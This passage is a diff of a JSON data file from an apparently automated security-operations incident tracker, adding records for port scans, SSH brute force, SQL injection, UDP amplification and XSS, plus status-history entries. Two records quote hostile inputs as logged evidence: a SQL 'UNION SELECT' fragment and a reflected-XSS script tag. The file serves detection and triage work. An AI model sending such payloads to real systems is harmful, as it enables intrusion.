+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-52HFJ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:05.569Z"
+        }
+      ],
+      "id": "INC-20260917-52HFJ",
+      "createdAt": "2026-09-17T17:25:05.569Z"
+    },
+    {
+      "incidentId": "INC-905545",
+      "title": "Privilege Escalation Intrusion Chain",
+      "description": "Multi-agent threat analysis identified 5 security anomaly events with risk score 98.",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 98,
+      "primaryIp": "203.0.113.50",
+      "affectedHost": "server01",
+      "mitreTechniques": [
+        "T1548.003",
+        "T1190",
+        "T1595",
+        "T1046",
+        "T1110"
+      ],
+      "id": "INC-905545",
+      "createdAt": "2026-09-17T17:25:05.546Z"
+    },
+    {
+      "incidentId": "INC-20260917-W9VJM",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "RESOLVED",
+      "riskScore": 88,
+      "primaryIp": "198.51.100.111",
+      "affectedHost": "edge-router-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-W9VJM-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .",
+          "timestamp": "2026-09-17T17:25:05.538Z"
+        }
+      ],
+      "id": "INC-20260917-W9VJM",
+      "createdAt": "2026-09-17T17:25:05.538Z",
+      "updatedAt": "2026-09-17T17:25:05.541Z"
+    },
+    {
+      "incidentId": "INC-20260917-1PQ00",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 95,
+      "primaryIp": "203.0.113.88",
+      "affectedHost": "domain-controller-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-1PQ00-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.",
+          "timestamp": "2026-09-17T17:25:05.527Z"
+        }
+      ],
+      "id": "INC-20260917-1PQ00",
+      "createdAt": "2026-09-17T17:25:05.527Z"
+    },
+    {
+      "incidentId": "INC-20260917-C7HI3",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 92,
+      "primaryIp": "192.0.2.144",
+      "affectedHost": "ecommerce-web-prod",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-C7HI3-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.",
+          "timestamp": "2026-09-17T17:25:05.524Z"
+        }
+      ],
+      "id": "INC-20260917-C7HI3",
+      "createdAt": "2026-09-17T17:25:05.524Z"
+    },
+    {
+      "incidentId": "INC-20260917-U6JSJ",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 84,
+      "primaryIp": "198.51.100.82",
+      "affectedHost": "auth-server-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-U6JSJ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.",
+          "timestamp": "2026-09-17T17:25:05.519Z"
+        }
+      ],
+      "id": "INC-20260917-U6JSJ",
+      "createdAt": "2026-09-17T17:25:05.519Z"
+    },
+    {
+      "incidentId": "INC-20260917-FQZ9H",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 76,
+      "primaryIp": "203.0.113.15",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260917-FQZ9H-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-17T17:25:05.513Z"
+        }
+      ],
+      "id": "INC-20260917-FQZ9H",
+      "createdAt": "2026-09-17T17:25:05.513Z"
+    },
+    {
+      "incidentId": "INC-EVAL-905485",
+      "title": "Automated Evaluation Incident",
+      "description": "Synthetic incident for connectivity verification",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 78,
+      "primaryIp": "198.51.100.99",
+      "affectedHost": "eval-workstation",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "investigationNotes": [],
+      "id": "INC-EVAL-905485",
+      "createdAt": "2026-09-17T17:25:05.503Z"
+    },
+    {
       "incidentId": "INC-20260917-66XCC",
       "title": "XSS_ATTACK",
       "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
@@ -1607,6 +4795,58 @@
   ],
   "incidentHistory": [
     {
+      "id": "INCH-1789665961814-cww1r",
+      "incidentId": "INC-20260917-RO1HQ",
+      "changedBy": "system",
+      "changeType": "STATUS_UPDATE",
+      "previousState": {
+        "status": "NEW"
+      },
+      "newState": {
+        "status": "RESOLVED"
+      },
+      "timestamp": "2026-09-17T17:26:01.814Z"
+    },
+    {
+      "id": "INCH-1789665932553-hjk5s",
+      "incidentId": "INC-20260917-LTLNP",
+      "changedBy": "system",
+      "changeType": "STATUS_UPDATE",
+      "previousState": {
+        "status": "NEW"
+      },
+      "newState": {
+        "status": "RESOLVED"
+      },
+      "timestamp": "2026-09-17T17:25:32.553Z"
+    },
+    {
+      "id": "INCH-1789665925431-b4agh",
+      "incidentId": "INC-20260917-0ZODZ",
+      "changedBy": "system",
+      "changeType": "STATUS_UPDATE",
+      "previousState": {
+        "status": "NEW"
+      },
+      "newState": {
+        "status": "RESOLVED"
+      },
+      "timestamp": "2026-09-17T17:25:25.431Z"
+    },
+    {
+      "id": "INCH-1789665905541-2nf6w",
+      "incidentId": "INC-20260917-W9VJM",
+      "changedBy": "system",
+      "changeType": "STATUS_UPDATE",
+      "previousState": {
+        "status": "NEW"
+      },
+      "newState": {
+        "status": "RESOLVED"
+      },
+      "timestamp": "2026-09-17T17:25:05.541Z"
+    },
+    {
       "id": "INCH-1789664156597-zc7wl",
       "incidentId": "INC-20260917-Y3HPF",
       "changedBy": "system",
@@ -1723,7 +4963,7 @@
         "BENIGN",
         "ANOMALY"
       ],
-      "updatedAt": "2026-09-17T16:53:16.835Z",
+      "updatedAt": "2026-09-17T17:28:08.638Z",
       "createdAt": "2026-09-17T10:19:33.460Z"
     },
     {
@@ -1736,7 +4976,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T16:53:16.836Z",
+      "updatedAt": "2026-09-17T17:28:08.639Z",
       "createdAt": "2026-09-17T10:19:29.754Z"
     },
     {
@@ -1749,7 +4989,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T16:53:16.837Z",
+      "updatedAt": "2026-09-17T17:28:08.643Z",
       "createdAt": "2026-09-17T10:19:25.998Z"
     },
     {
@@ -1761,7 +5001,7 @@
         "BENIGN",
         "ANOMALY"
       ],
-      "updatedAt": "2026-09-17T16:53:16.837Z",
+      "updatedAt": "2026-09-17T17:28:08.642Z",
       "createdAt": "2026-09-17T10:19:25.998Z"
     },
     {
@@ -1774,7 +5014,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T16:53:16.836Z",
+      "updatedAt": "2026-09-17T17:28:08.641Z",
       "createdAt": "2026-09-17T10:19:25.998Z"
     },
     {
@@ -1787,7 +5027,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T16:53:16.836Z",
+      "updatedAt": "2026-09-17T17:28:08.640Z",
       "createdAt": "2026-09-17T10:19:25.997Z"
     },
     {
@@ -1799,7 +5039,7 @@
         "BENIGN",
         "ANOMALY"
       ],
-      "updatedAt": "2026-09-17T16:53:16.837Z",
+      "updatedAt": "2026-09-17T17:28:08.644Z",
       "createdAt": "2026-09-17T09:57:59.656Z"
     },
     {
@@ -1812,7 +5052,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T16:53:16.837Z",
+      "updatedAt": "2026-09-17T17:28:08.645Z",
       "createdAt": "2026-09-17T09:57:59.656Z"
     }
   ]
